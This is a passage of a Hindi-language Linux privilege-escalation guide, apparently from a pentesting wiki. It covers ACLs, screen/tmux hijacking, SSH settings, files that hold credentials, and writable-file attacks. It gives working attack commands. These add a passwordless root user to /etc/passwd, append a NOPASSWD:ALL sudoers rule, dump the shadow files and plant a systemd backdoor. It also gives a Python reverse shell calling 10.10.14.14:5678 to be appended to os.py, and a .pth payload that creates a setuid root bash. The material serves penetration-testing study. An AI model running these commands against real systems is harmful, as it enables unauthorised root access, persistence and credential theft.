## डायरेक्टरी की permissions

किसी डायरेक्टरी में **"execute" का bit** यह दर्शाता है कि प्रभावित user उस folder में "**cd**" कर सकता है।\
**"read" का bit** यह दर्शाता है कि user **files की सूची देख सकता है**, और **"write" का bit** यह दर्शाता है कि user नई **files को delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs), discretionary permissions की द्वितीयक परत हैं, जो **पारंपरिक ugo/rwx permissions को override कर सकती हैं**। ये permissions उन विशिष्ट users को अधिकार देने या रोकने की सुविधा देकर file या directory access पर नियंत्रण बढ़ाती हैं, जो मालिक नहीं हैं या group का हिस्सा नहीं हैं। **इस स्तर की बारीकी से access management अधिक सटीक होता है**। अधिक जानकारी [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती है।<sup>[[19]](#references)</sup>

किसी file पर user "kali" को read और write permissions **दें**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-ins में छिपा ACL backdoor

एक आम misconfiguration यह है कि `/etc/sudoers.d/` में `440` mode वाली root के स्वामित्व की फ़ाइल ACL के ज़रिए किसी low-priv user को फिर भी write access देती है।

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

यदि आपको `user:alice:rw-` जैसा कुछ दिखे, तो user प्रतिबंधात्मक mode bits के बावजूद sudo नियम जोड़ सकता है:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

यह एक high-impact ACL persistence/privesc path है, क्योंकि केवल `ls -l` से की गई समीक्षा में इसे आसानी से नज़रअंदाज़ किया जा सकता है।

## खुले shell sessions

दूसरे user को GNU Screen access मिलना केवल उसके version पर नहीं, बल्कि **चल रहे session के configuration और ACL** पर निर्भर करता है। [GNU Screen के दस्तावेज़](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) बताते हैं कि इसे multiuser support के साथ build किया जाना चाहिए; `multiuser on` और `acladd` या उपयुक्त `aclchg` grant से किसी दूसरे user को attach करने की अनुमति मिलती है। [Manual में cross-user session lookup के लिए setuid-root की भी आवश्यकता है](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)। दिखाई देने वाला root-owned socket या अकेली SUID `screen` binary यह साबित नहीं करती कि root shell से attach किया जा सकता है। इसे privilege escalation मानने से पहले पुष्टि करें कि live session multiuser है, मौजूदा user के पास input/command की प्रभावी अनुमति है, और उस session में shell privileged owner के रूप में चल रहा है।

### screen sessions hijacking

**screen sessions की सूची बनाएँ**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket स्थान (कुछ systems इनमें से एक को दूसरे के symlink के रूप में दिखाते हैं): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**किसी session से जुड़ें**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

यह **पुराने tmux versions** में एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions की सूची**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket locations (कुछ systems में एक दूसरे का symlink होता है) - tmux sessions hijacking: tmux -S /tmp/dev sess ls उस socket का उपयोग करके सूची देखें, आप उस socket में tmux session शुरू कर सकते हैं...](<../../images/image (837).png>)

**किसी session से जुड़ें**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

HTB के **Valentine box** में एक उदाहरण देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

ऐतिहासिक रूप से vulnerable अवधि के दौरान प्रभावित Debian या derivative OpenSSL builds से बनाई गई keys में predictable randomness हो सकती है; host का मौजूदा distribution या patched OpenSSL version यह साबित नहीं करता कि कोई पुरानी key कैसे बनाई गई थी। **विशिष्ट key** को उपयुक्त historical blacklist और उसकी provenance के आधार पर जांचें। Debian का [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) public keys और `authorized_keys` की जांच करने का तरीका बताता है, और [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) OpenSSL fix दर्ज करता है। किसी privileged account की `authorized_keys` में entry तभी privilege-escalation का संकेत है, जब उससे मेल खाने वाली private key recover की जा सके और प्रभावी SSH policy अब भी उस account के लिए उस key को स्वीकार करती हो; कमजोर **host** key अपने आप में login credential नहीं है। Compromised keys को बदलें और उनके पुराने authorizations हटाएं।

### SSH की दिलचस्प configuration values

- **PasswordAuthentication:** बताता है कि password authentication की अनुमति है या नहीं। Upstream OpenSSH default `yes` है; distribution configuration इसे override कर सकती है।
- **PubkeyAuthentication:** बताता है कि public key authentication की अनुमति है या नहीं। Default `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह बताता है कि server खाली password strings वाले accounts में login की अनुमति देता है या नहीं। Default `no` है।

### Login control files

ये files तय करती हैं कि कौन login कर सकता है और कैसे:

- **`/etc/nologin`**: मौजूद होने पर, non-root logins को रोकती है और अपना message दिखाती है।
- **`/etc/securetty`**: उन जगहों को सीमित करती है जहां root login कर सकता है (TTY allowlist)।
- **`/etc/motd`**: login के बाद दिखाया जाने वाला banner (environment या maintenance की जानकारी leak कर सकता है)।

### PermitRootLogin

बताता है कि root ssh का उपयोग करके login कर सकता है या नहीं। Upstream OpenSSH default `prohibit-password` है; distribution configuration इसे override कर सकती है। संभावित values:

- `yes`: root password और private key, दोनों का उपयोग करके login कर सकता है
- `without-password` या `prohibit-password`: root केवल private key से login कर सकता है
- `forced-commands-only`: Root केवल private key से और commands options निर्दिष्ट होने पर ही login कर सकता है
- `no` : नहीं

### Trusted SSH user certificate authorities

`TrustedUserCAKeys` उन public keys के नाम बताता है जिन पर sshd **user** certificates पर हस्ताक्षर करने के लिए भरोसा करता है। यदि संबंधित private CA key किसी कम privilege वाले user द्वारा पढ़ी जा सकती है, तो जांचें कि कौन certificate प्राप्त कर सकता है और किन account principals के रूप में authenticate कर सकता है। `AuthorizedPrincipalsFile` या `AuthorizedPrincipalsCommand` स्वीकार किए जाने वाले names को सीमित कर सकते हैं; इनमें से कोई भी configured न होने पर, certificate में target account का नाम होना चाहिए। `PermitRootLogin prohibit-password` root password authentication को रोकता है, लेकिन certificate authentication की अनुमति दे सकता है। केवल key path का exposed होना access साबित नहीं करता: public/private key pair, प्रभावी `Match` rules, account policy, key passphrase, revocation और स्वीकार किए जाने वाले signature algorithms की पुष्टि करें। Enumeration output में private-key bytes शामिल न करें। [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) देखें।

वर्तमान user द्वारा पढ़ी न जा सकने वाली private CA key भी उपयोगी हो सकती है, **यदि** कोई privilege-delegation rule उस user को key के owner की identity के तहत बिना किसी प्रतिबंध वाला [certificate signer, जैसे `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), चलाने देता है। दिए गए exact command और arguments का मिलान signer account की key तक पहुंच, प्रभावी sshd configuration द्वारा trusted public CA, target account के लिए स्वीकार principal, certificate validity और उस account की login policy से करें। Delegated signer command या trusted CA file अकेले किसी दूसरे account तक access साबित नहीं करती; passive enumeration के दौरान test certificate पर हस्ताक्षर न करें।

अलग per-account CA trust path के लिए, [SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion) देखें।

### AuthorizedKeysFile

उन files को निर्दिष्ट करता है जिनमें user authentication के लिए इस्तेमाल की जा सकने वाली public keys होती हैं। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदल दिया जाएगा। **आप absolute paths** (`/` से शुरू होने वाले) या **user के home से relative paths** निर्दिष्ट कर सकते हैं। उदाहरण के लिए:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

वह configuration बताएगा कि यदि आप user "**testusername**" की **private** key से login करने की कोशिश करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding से आप **keys को अपने server पर छोड़ने के बजाय अपनी local SSH keys का इस्तेमाल** कर सकते हैं (बिना passphrases के!)। इसलिए, आप ssh के ज़रिए **किसी host तक jump** कर सकेंगे और वहाँ से **अपने शुरुआती host में मौजूद key का इस्तेमाल करके** **दूसरे host तक jump** कर सकेंगे।

आपको यह option `$HOME/.ssh.config` में इस तरह set करना होगा:

```
Host example.com
  ForwardAgent yes
```

ध्यान दें कि अगर `Host` हर बार `*` है, जब उपयोगकर्ता किसी दूसरी मशीन पर जाता है, तो वह होस्ट keys तक पहुँच सकेगा (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इन **options** को **override** कर सकती है और इस कॉन्फ़िगरेशन को अनुमति दे सकती है या अस्वीकार कर सकती है।\
फ़ाइल `/etc/sshd_config` कीवर्ड `AllowAgentForwarding` के ज़रिए ssh-agent forwarding को **अनुमति** दे सकती है या **अस्वीकार** कर सकती है (डिफ़ॉल्ट रूप से अनुमति है)।

अगर आपको किसी environment में Forward Agent कॉन्फ़िगर किया हुआ मिले, तो अगला पेज पढ़ें, क्योंकि **आप इसका दुरुपयोग करके privileges escalate कर सकते हैं**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत आने वाली फ़ाइलें **वे scripts हैं जो उपयोगकर्ता के नया shell चलाने पर execute होती हैं**। इसलिए, अगर आप इनमें से किसी को **लिख या संशोधित कर सकते हैं, तो आप privileges escalate कर सकते हैं**।

```bash
ls -l /etc/profile /etc/profile.d/
```

अगर कोई अजीब profile script मिले, तो उसमें **संवेदनशील जानकारी** है या नहीं, यह जाँचें।

### Passwd/Shadow फ़ाइलें

OS के आधार पर `/etc/passwd` और `/etc/shadow` फ़ाइलों का नाम अलग हो सकता है या उनका backup मौजूद हो सकता है। इसलिए इन सभी फ़ाइलों को **ढूँढने** और यह **जाँचने** की सलाह दी जाती है कि क्या आप उन्हें पढ़ सकते हैं और उनमें **hashes** हैं या नहीं:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

कुछ मामलों में आपको `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** मिल सकते हैं.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित में से किसी एक कमांड से पासवर्ड जनरेट करें।

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

फिर उपयोगकर्ता hacker जोड़ें और जनरेट किया गया पासवर्ड जोड़ें।

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं

वैकल्पिक रूप से, बिना पासवर्ड वाला dummy user जोड़ने के लिए आप निम्न पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: इससे मशीन की मौजूदा सुरक्षा कमजोर हो सकती है।

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ध्यान दें: BSD platforms में `/etc/passwd` की जगह `/etc/pwd.db` और `/etc/master.passwd` होते हैं, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप **किसी service configuration file** में लिख सकते हैं?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को संशोधित कर सकते हैं,** तो आप इन पंक्तियों को संशोधित कर सकते हैं:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

आपका backdoor अगली बार tomcat शुरू होने पर execute होगा।

### फ़ोल्डर जाँचें

इन फ़ोल्डरों में backups या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आख़िरी फ़ोल्डर को पढ़ नहीं पाएँगे, लेकिन कोशिश करें)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### अजीब लोकेशन/Owned फ़ाइलें

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### पिछले कुछ मिनटों में संशोधित फ़ाइलें

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB फ़ाइलें

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

पढ़ने योग्य application databases के लिए, usernames और password hashes वाले table और column names की जाँच करें। Hash ढूँढ़ना, उसका password recover करना, और local account के लिए उसके reuse को साबित करना अलग-अलग चरण हैं; केवल 32-अक्षरों वाली सामान्य hexadecimal string से MD5 या account access का अनुमान नहीं लगाया जा सकता।

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

यदि पढ़ने योग्य shell history में `sudo` command के बाद password जैसी दिखने वाली कोई छोटी पंक्ति हो, तो आसपास की पंक्तियों को मैन्युअल रूप से जांचें। सामान्य `sudo` prompt में दर्ज किया गया password shell history में सहेजा नहीं जाता; उसके बाद की पंक्ति केवल गलती से shell में दिया गया input हो सकती है, किसी मान्य password का प्रमाण नहीं। `.sudo_as_admin_successful` marker पहले के उपयोग को दर्ज करता है, मौजूदा authorization को नहीं।

### छिपी हुई फ़ाइलें

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH में Script/Binaries**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **वेब फ़ाइलें**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **बैकअप**

बैकअप डायरेक्टरी के अंदर मौजूद पढ़ी जा सकने वाली फ़ाइलों के साथ-साथ उन फ़ाइलों की भी जाँच करें जिनके **नाम** में `backup` हो: अपारदर्शी नाम वाले या encrypted extension वाले archive में भी पुराने application data उजागर हो सकते हैं। Encrypted archive केवल संभावित exposure है। Password recovery, उसकी सामग्री की जाँच, application hash की recovery, और उस password का Unix account के लिए दोबारा इस्तेमाल—इनकी पुष्टि अलग-अलग चरणों में करनी होगी; archive में मौजूद hash से यह साबित नहीं होता कि उससे local login किया जा सकता है।

पढ़े जा सकने वाले virtual-machine backup की भी इसी तरह जाँच करें। VirtualBox `.vbox` configuration से जुड़े `.vdi` images की पहचान हो सकती है और उसमें encrypted disk-key metadata भी हो सकता है; [VirtualBox दस्तावेज़ बताते हैं कि encrypted data key VM configuration में संग्रहीत होती है](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)। Offline disk की जाँच तभी संभव है जब configuration और image, दोनों तक पहुँच हो। Guest volume में अपनी [LUKS encryption layer](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) हो सकती है, जिसके लिए अलग key की ज़रूरत होगी। अधिकृत decryption के बाद भी पुरानी scripts या configuration में password हो सकता है; इसे local privilege escalation कहने से पहले पुष्टि करें कि credential किसी host account के लिए अभी भी मान्य है और उसकी प्रभावी `sudo` policy से privileged command चलाने की अनुमति मिलती है। Passive enumeration के दौरान images को copy, decrypt या mount किए बिना paths और permissions की सूची बनाएँ।

किसी पढ़े जा सकने वाले archive की जाँच करते समय, कुछ भी extract करने से पहले member names की सूची देखें: छिपी हुई authenticator files, recovery-code material या SSH keys मौजूद हो सकती हैं, भले ही उनकी live copies सुरक्षित हों। फ़ाइल के नाम से केवल एक संभावित सुराग मिलता है; सामग्री और किसी भी account reuse की अलग से पुष्टि करें।

बैकअप डायरेक्टरी में **किसी अन्य user के स्वामित्व वाले और पढ़े जा सकने वाले archives** को प्राथमिकता दें, खास तौर पर root के स्वामित्व वाले archives और वे जिन्हें group membership के ज़रिए पढ़ा जा सकता है। किसी पुराने archive में configuration या authentication secret हो सकता है, भले ही live copy सुरक्षित हो। [Backrest](https://garethgeorge.github.io/backrest/) जैसे local backup UI के लिए service के प्रभावी account की जाँच करें और पता करें कि क्या कम privilege वाला user इसकी configuration पढ़ सकता है या UI में authenticate कर सकता है। इसके [hooks](https://garethgeorge.github.io/backrest/docs/hooks) और [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), daemon के file और command privileges के साथ काम कर सकते हैं; केवल loopback listener से impact तय नहीं होता। Backrest का `passwordBcrypt`, इसके [authentication code](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) में base64-encoded bcrypt hash है, plaintext password नहीं। Exposed archive या UI को privilege boundary मानने से पहले service identity, उपयोग किए जा सकने वाले credentials, और संबंधित plan या repository तक पहुँच की पुष्टि करें.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### पासवर्ड वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का कोड पढ़ें। यह **कई ऐसी संभावित फ़ाइलें खोजता है जिनमें पासवर्ड हो सकते हैं**।\
**एक और उपयोगी टूल** है [**LaZagne**](https://github.com/AlessandroZ/LaZagne), एक open source application जिसका उपयोग Windows, Linux और Mac पर स्थानीय कंप्यूटर में स्टोर किए गए कई पासवर्ड प्राप्त करने के लिए किया जाता है।

अगर `/etc/guacamole/guacamole.properties` पढ़ी जा सकती है, तो उसकी `mysql-*`, `postgresql-*` या `sqlserver-*` database connection settings देखें। यदि खाते को Guacamole JDBC tables पढ़ने की अनुमति है, तो `guacamole_connection_parameter` में सेव किए गए SSH `username`, `password`, `private-key` या `passphrase` मान हो सकते हैं। पहले connection IDs और parameter names देखें, फिर केवल संबंधित rows की जाँच करें; सेव किया गया मान दोबारा इस्तेमाल किया जा सकने वाला secret होने के बजाय dynamic token या vault reference भी हो सकता है। [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) और [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) देखें।

[pswm password manager](https://github.com/Julynx/pswm#usage) डिफ़ॉल्ट रूप से `~/.local/share/pswm/pswm` में encrypted vault स्टोर करता है। यदि किसी अन्य user का vault दिखाई देता है, तो उसका ownership और यह जाँचें कि आपका account उसे वास्तव में पढ़ सकता है या नहीं। केवल vault path से credentials का पता नहीं चलता; उसका master password प्राप्त करना, दोबारा इस्तेमाल किया जा सकने वाला account password खोजना और उस account के privileges की पुष्टि करना अलग-अलग चरण हैं।

[Passpie का डिफ़ॉल्ट database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) `~/.passpie/` है। इसमें `.keys` keyring और group directories के भीतर encrypted `.pass` credential files होती हैं। Database directory का दिखाई देना केवल path की जानकारी देता है: key और संबंधित encrypted entry तक पहुँच, आवश्यक master passphrase, और यह पुष्टि करें कि प्राप्त credential किसी अधिक privileges वाले account का है या नहीं। Passpie [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) का भी समर्थन करता है, इसलिए डिफ़ॉल्ट path सभी संभावित paths को कवर नहीं करता। Automated enumeration में credentials export किए बिना या key material प्रिंट किए बिना metadata की सूची बनाएँ।

### Logs

अगर आप logs पढ़ सकते हैं, तो उनमें **उपयोगी/गोपनीय जानकारी मिल सकती है**। Log जितना अजीब होगा, उतना ही दिलचस्प होने की संभावना है।\
इसके अलावा, कुछ गलत तरीके से configured (backdoored?) **audit logs** में **पासवर्ड रिकॉर्ड किए जा सकते हैं**, जैसा कि इस post में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

लॉग पढ़ने के लिए [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **समूह** बहुत उपयोगी होगा।

### Shell फ़ाइलें

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### सामान्य Creds खोज/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या **कंटेंट** के अंदर "**password**" शब्द हो। साथ ही, logs के अंदर IPs और emails, या hashes regexps भी जाँचें।\
मैं यहाँ यह सब करने का तरीका नहीं बताऊँगा, लेकिन अगर आपकी रुचि है, तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले आख़िरी checks देख सकते हैं।

## लिखने योग्य फ़ाइलें

### Python library hijacking

अगर आपको पता है कि python script **कहाँ से** execute होने वाली है और आप उस folder के **अंदर लिख सकते हैं**, या python libraries को **modify कर सकते हैं**, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (अगर आप उस जगह लिख सकते हैं जहाँ से python script execute होने वाली है, तो os.py library को copy और paste करें)।

**library में backdoor डालने** के लिए, os.py library के अंत में यह line जोड़ें (IP और PORT बदलें):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` द्वारा प्रोसेस की जाने वाली लिखने योग्य `.pth` फ़ाइल

`site.addsitedir(DIR)` को `sys.path.append(DIR)` के बराबर न मानें। यह `DIR` की हर `*.pth` फ़ाइल को भी प्रोसेस करता है। `import` से शुरू होने वाली और उसके बाद space या tab वाली पंक्ति Python code के रूप में निष्पादित होती है। इसके बजाय, path वाली पंक्तियों को site directory के सापेक्ष resolve किया जाता है और केवल तभी जोड़ा जाता है जब वे मौजूद हों।<sup>[[38]](#references)</sup>

यह privilege escalation तब बन जाता है जब sudo-allowed या अन्यथा विशेषाधिकार-प्राप्त Python प्रोग्राम `site.addsitedir()` को ऐसी directory पर कॉल करता है जिसे मौजूदा user या उसके किसी group द्वारा लिखा जा सकता है। विशेषाधिकार-प्राप्त प्रोग्राम अपना सामान्य action dispatch करने से पहले, अपना import path सेट करते समय `.pth` code चलाता है।<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Executable `.pth` content एक ही पंक्ति में होना चाहिए, लेकिन semicolon से कई statements लिखे जा सकते हैं। उदाहरण के लिए, root के रूप में चलने वाला path setuid Bash की copy बना सकता है; अपने effective ID को बनाए रखने के लिए Bash को `-p` के साथ चलाएँ।<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` विकल्प केवल Python के स्वचालित `site` initialization को अक्षम करता है। यह उस प्रोग्राम की सुरक्षा नहीं करता जो स्पष्ट रूप से `site` import करता है और `site.addsitedir()` को कॉल करता है। privileged import paths से हमलावर के लिखने योग्य directories हटाएँ और सुनिश्चित करें कि directory और उसकी `.pth` files का स्वामित्व privileged administrator के पास हो तथा केवल वही उनमें लिख सके।<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate exploitation

एक privileged `logrotate` job, किसी कम-privileged user के नियंत्रण वाली directory के भीतर मौजूद log को वास्तव में rotate करते समय, cross-user file-write का रास्ता बना सकता है—यदि वह user rotation के दौरान उस directory को बदल या redirect कर सकता हो। केवल writable log मिलना जाँच का संकेत है। सटीक सक्रिय rule और उसके `create`, `olddir`, तथा `su` directives की पुष्टि करें; scheduler की प्रभावी identity; log की parent directory पर write और search permissions; और यह कि installed build तथा policy destination बदलने की अनुमति देते हैं या नहीं। बाद में चलने वाले privileged shell को command execution के लिए startup-file write से बनी file को load करना भी आवश्यक है। बिना rotation trigger किए या race आज़माए, schedule, rule, version/packaging और path metadata की जाँच करें।

> [!TIP]
> `3.18.0` या किसी अकेले version string को exploitability की सीमा न मानें। [Upstream का change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) कई releases में directory और symlink hardening दर्ज करता है, और distributions fixes को backport कर सकती हैं। [Upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) सुझाव देता है कि जब root, non-privileged users के नियंत्रण वाली directories में logs rotate करे, तो `su` का उपयोग किया जाए; प्रभावी rule और वास्तविक व्यवहार की पुष्टि करें।

इस vulnerability के बारे में अधिक जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)।<sup>[[37]](#references)</sup>

आप [**logrotten**](https://github.com/whotwagner/logrotten) से इस vulnerability का exploit कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** से बहुत मिलती-जुलती है। इसलिए, जब भी आपको logs बदलने की क्षमता मिले, तो जाँचें कि उन logs का प्रबंधन कौन कर रहा है और क्या symlinks से logs बदलकर privileges escalate किए जा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)।<sup>[[20]](#references)</sup>

